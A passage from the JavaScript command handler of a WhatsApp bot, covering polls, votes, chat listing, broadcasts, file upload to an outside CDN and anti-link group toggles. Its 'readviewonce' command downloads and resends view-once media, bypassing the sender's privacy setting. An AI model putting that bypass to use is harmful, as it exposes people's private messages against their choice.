Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
//=================================================
//=================={{=[===================]]\\
case 'tourl': 
case 'url': {
async function uploadwidipe(poto) {
  const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");
const path = require('path');
    try {
      const mime = require('mime-types');
  const form = new FormData();
  const contentType = mime.lookup(poto);
  const fileName = path.basename(poto);
  form.append('file', fs.createReadStream(poto), {
    contentType: contentType || 'application/octet-stream',
    filename: fileName,
  });
      const response = await axios.post('https://cdn.elxyzgpt.xyz/', form, {
        headers: form.getHeaders(),
        onUploadProgress: (progressEvent) => {
          if (progressEvent.lengthComputable) {
            console.log(`🚀 Upload Progress: ${(progressEvent.loaded * 100) / progressEvent.total}%`);
          }
        }
      });
    const hasilnya = response.data.fileUrl
      console.log('🎉 File Upload Success:', response.data);
      return hasilnya;
    } catch (error) {
      console.error('🚫 Upload Failed:', error);
      reject(error);
    }
}
  try {
    const media = await NanoBotz.downloadAndSaveMediaMessage(quoted);
    const anuu = await uploadwidipe(media);
    replynano(`📮 *L I N K :*
${anuu}
📊 *S I Z E :* ${media.length} Byte`);
    await fs.unlinkSync(media);
  } catch (error) {
    console.error('Error:', error);
    replynano('Error uploading file.');
  }
}
  break;
//=================================================================

case 'vv':
case 'readviewonce': {
	if (!m.quoted) return replynano(`Reply to see a message once`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replynano(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return NanoBotz.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return NanoBotz.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'join': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!text) return replynano(`Sample ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replynano('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await NanoBotz.groupAcceptInvite(result)
await replynano(`Done`)
}
break
case 'poll': {
	if (!DanzTheCreator) return reply(mess.only.owner)
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await replynano(
`Mention questions and at least 2 choices\nSample: ${prefix}poll who is the best admin?|patron,bluedemon,minato...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await NanoBotz.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break
        case 'vote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (m.chat in vote) return replynano(`_There is still a sound in this chat!_\n\n*${prefix}deletevote* - to remove the sound`)
            if (!text) return replynano(`Enter the reason for choosing, Sample: *${prefix + command} Handsome owner*`)
            replynano(`The voting begins!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - for Check the sound\n*${prefix} deletevote* - to remove the sound`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            NanoBotz.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replynano(`_*There is no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replynano('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            NanoBotz.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
case 'downvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replynano(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replynano('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            NanoBotz.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
 
case 'checkvote':
if (!m.isGroup) return reply(mess.only.group)
if (!(m.chat in vote)) return replynano(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${NanoBotz.user.id}
`
NanoBotz.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case 'delvote': case 'hapusvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replynano(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replynano('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'tovv': case 'toviewonce': { 
if (!quoted) return replynano(`Reply Image/Video`)
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
if (/image/.test(mime)) {
anuan = await NanoBotz.downloadAndSaveMediaMessage(quoted)
NanoBotz.sendMessage(m.chat, {image: {url:anuan}, caption: `Here he is!!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await NanoBotz.downloadAndSaveMediaMessage(quoted)
NanoBotz.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here he is!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replynano(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replynano(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
case 'paptt': {
 if (!isPrem) return replyprem(mess.premium)
global.paptt = [
 "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
 "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
 "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
 "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
 "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
 "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
 "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
 "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
 "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
 "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
 "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
 "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
 "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
 ]
	let url = paptt[Math.floor(Math.random() * paptt.length)]
	NanoBotz.sendFile(m.chat, url, null, 'Tch, dasar sangean', m)
}
break

            case 'listpc': {
 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
 for (let i of anulistp) {
 let nama = store.messages[i].array[0].pushName
 teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 NanoBotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
 for (let i of anulistg) {
 let metadata = await NanoBotz.groupMetadata(i)
 teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 NanoBotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'ping': case 'botstatus': case 'statusbot': {
              const used = process.memoryUsage()
              const cpus = os.cpus().map(cpu => {
              cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                            return cpu
              })
              const cpu = cpus.reduce((last, cpu, _, { length }) => {
              last.total += cpu.total
              last.speed += cpu.speed / length
              last.times.user += cpu.times.user
              last.times.nice += cpu.times.nice
              last.times.sys += cpu.times.sys
              last.times.idle += cpu.times.idle
              last.times.irq += cpu.times.irq
              return last
              }, {
              speed: 0,
              total: 0,
              times: {
                                user: 0,
                                nice: 0,
                                sys: 0,
                                idle: 0,
                                irq: 0
              }
              })
              let timestamp = speed()
              let latensi = speed() - timestamp
              neww = performance.now()
              oldd = performance.now()
              respon = `Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())} \n\n> ᴘᴀᴛʀᴏɴ ˣᵀᴿᴬᴵᵀˢ
              `
              replynano(respon)
                          }
                          break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!DanzTheCreator) return reply(mess.only.owner)
		            if (!q) return replynano(`Enter the text`)
		        const data = await store.chats.all()
        for (let i of data) {
           NanoBotz.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
           await sleep(1000)
        }
        }
        break
        case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!DanzTheCreator) return reply(mess.only.owner)
        if (!q) return replynano(`Enter the text`)
        let getGroups = await NanoBotz.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        replynano(` Posting in ${xeoncast.length} Group chat, deep ${xeoncast.length * 1,5} second`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await NanoBotz.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await NanoBotz.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replynano(`BThe results are broadcast in the group ${xeoncast.length}`)      
        break
case 'block': case 'ban': {
		if (!DanzTheCreator) return reply(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await NanoBotz.updateBlockStatus(users, 'block')
		await replynano(`Done`)
	}
	break
        case 'unblock': case 'unban': {
		if (!DanzTheCreator) return reply(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await NanoBotz.updateBlockStatus(users, 'unblock')
		await replynano(`Done`)
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replynano(lisben)
	}
	break

case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
NanoBotz.groupRevokeInvite(m.chat)
}
break
            case 'react': {
if (!DanzTheCreator) return reply(mess.only.owner)
reactionMessage = {
react: {
    text: args[0],
    key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
NanoBotz.sendMessage(m.chat, reactionMessage)
            }
            break
            case 'unmute': {
              // Check if the command is being used in a group
              if (!m.isGroup) return reply(mess.only.group);

              // Check if the user is an admin or the owner of the bot
              if (!isAdmins && !DanzTheCreator) return reply('Admin only!!');

              // Check if the bot has admin rights
              if (!isBotAdmins) return reply('_Bots Should Be Admins First_');

              try {
                  // Unmute the group (everyone can send messages)
                  await NanoBotz.groupSettingUpdate(m.chat, 'not_announcement');
                  replynano('*ᴜɴᴍᴜᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ.*');
              } catch (err) {
                  console.error(err);
                  reply('Failed to unmute the group. Please try again.');
              }
              break;
          }
  case 'mute': {
              // Check if the command is being used in a group
              if (!m.isGroup) return reply(mess.only.group);

              // Check if the user is an admin or the owner of the bot
              if (!isAdmins && !DanzTheCreator) return reply('Admin only!!');

              // Check if the bot has admin rights
              if (!isBotAdmins) return reply('_Bots Should Be Admins First_');

              try {
                  // Mute the group (only admins can send messages)
                  await NanoBotz.groupSettingUpdate(m.chat, 'announcement');
                  replynano('*ᴍᴜᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ.*');
              } catch (err) {
                  console.error(err);
                  reply('Failed to mute the group. Please try again.');
              }
              break;
          }
case 'autostickergc':
            case 'autosticker':
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (args.length < 1) return replynano('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replynano(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replynano('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replynano('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (antiVirtex) return replynano('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replynano('Success in turning on antivirus in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replynano('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replynano('Success in turning off antivirus this group')
} else {
  
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
    if (!m.isGroup) return reply(mess.only.group)
    if (!isBotAdmins) return reply('_The Bot should be the admin first_')
    if (!isAdmins && !DanzTheCreator) return reply('Specifically for admins!!')
    if (args[0] === "on") {
    if (AntiLinkYoutubeVid) return replynano('Already activated')
    ntilinkytvid.push(from)
    fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
    replynano('Success in turning on youtube video antilink in this group')
    var groupe = await NanoBotz.groupMetadata(from)
    var members = groupe['participants']
    var mems = []
    members.map(async adm => {
    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
    })
    NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
    } else if (args[0] === "off") {
    if (!AntiLinkYoutubeVid) return replynano('Already deactivated')
    let off = ntilinkytvid.indexOf(from)
    ntilinkytvid.splice(off, 1)
    fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
    replynano('Success in turning off youtube video antilink in this group')
    } else {
      let msg = generateWAMessageFromContent(from, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: `Two ${pushname}\nPlease click the button below to use _*${command}*_ command`
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
              title: ``,
              gifPlayback: true,
              subtitle: ownername,
              hasMediaAttachment: false
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: `{
                    "title":"SELECT ON/OFF ♨️",
                    "sections":[{
                      "title":"SELECT ON/OFF ",
                      "rows":[{
                        "header":"TURN IT ON 🚹",
                        "title":"CHOOSE ",
                        "description":"ON 🚹",
                        "id":"${prefix + command} on"
                      },
                      {
                        "header":"OFF ❌",
                        "title":"CHOOSE ",
                        "description":"OFF ❌",
                        "id":"${prefix + command} off"
                      }]
                    }]
                  }`
                }
              ]
            }),
            contextInfo: {
              mentionedJid: [m.sender],
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '120363303045895814@newsletter',
                newsletterName: ownername,
                serverMessageId: 143
              }
            }
          })
        }
      }
    }, { quoted: m });
    
    await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id
    });
      }
      }
      break
      case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
        if (args[0] === "on") {
        if (AntiLinkYoutubeChannel) return replynano('Already activated')
        ntilinkytch.push(from)
        fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
        replynano('Success in turning on youtube channel antilink in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!AntiLinkYoutubeChannel) return replynano('Already deactivated')
        let off = ntilinkytch.indexOf(from)
        fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
        ntilinkytch.splice(off, 1)
        replynano('Success in turning off youtube channel antilink in this group')
        } else {
          let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hi ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break
              case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
        if (args[0] === "on") {
        if (AntiLinkInstagram) return replynano('Already activated')
        ntilinkig.push(from)
        fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
        replynano('Success in turning on instagram antilink in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!AntiLinkInstagram) return replynano('Already deactivated')
        let off = ntilinkig.indexOf(from)
        ntilinkig.splice(off, 1)
        fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
        replynano('Success in turning off instagram antilink in this group')
        } else {
          let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hi ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break
                case 'antilinkfacebook': case 'antilinkfb': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
        if (args[0] === "on") {
        if (AntiLinkFacebook) return replynano('Already activated')
        ntilinkfb.push(from)
        fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
        replynano('Success in turning on facebook antilink in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!AntiLinkFacebook) return replynano('Already deactivated')
        let off = ntilinkfb.indexOf(from)
        ntilinkfb.splice(off, 1)
        fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
        replynano('Success in turning off facebook antilink in this group')
        } else {
          let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hi ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break
                  case 'antilinktelegram': case 'antilinktg': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
        if (args[0] === "on") {
        if (AntiLinkTelegram) return replynano('Already activated')
        ntilinktg.push(from)
        fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
        replynano('Success in turning on telegram antilink in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!AntiLinkTelegram) return replynano('Already deactivated')
        let off = ntilinktg.indexOf(from)
        ntilinktg.splice(off, 1)
        fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
        replynano('Success in turning off telegram antilink in this group')
        } else {
          let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
